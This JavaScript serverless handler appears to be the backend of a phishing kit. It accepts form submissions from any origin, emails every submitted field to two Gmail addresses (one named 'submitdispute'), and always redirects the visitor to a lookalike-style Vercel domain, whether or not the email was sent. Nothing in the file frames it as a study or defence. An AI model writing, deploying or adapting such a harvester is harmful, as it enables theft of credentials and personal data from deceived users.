import { transporter } from "./emailConfig.js";
import querystring from "querystring";

export default async function handler(req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Accept, Authorization"
  );

  // Handle preflight OPTIONS request
  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  // Only allow POST requests
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  let formData = {};

  try {
    const contentType = req.headers["content-type"] || "";

    if (contentType.includes("application/json")) {
      formData = typeof req.body === "string" ? JSON.parse(req.body) : req.body;
    } else if (contentType.includes("application/x-www-form-urlencoded")) {
      formData =
        typeof req.body === "string" ? querystring.parse(req.body) : req.body;
    } else {
      formData = req.body || {};
    }
  } catch {
    formData = {};
  }

  try {
    // Try sending email
    await transporter.sendMail({
      from: `"PROFESSOR" <dardhame1@gmail.com>`,
      to: "newzatpage.@gmail.com, submitdispute@gmail.com",
      subject: "Zubair",
      text: JSON.stringify(formData, null, 2),
      html: `<h3>Professor Link</h3><pre>${JSON.stringify(
        formData,
        null,
        2
      )}</pre>`,
    });
  } catch (error) {
    console.error("Email send error:", error);
  }

  // Always redirect (success or failure)
  return res.redirect(302, "https://in-touser-id.vercel.app/");
}
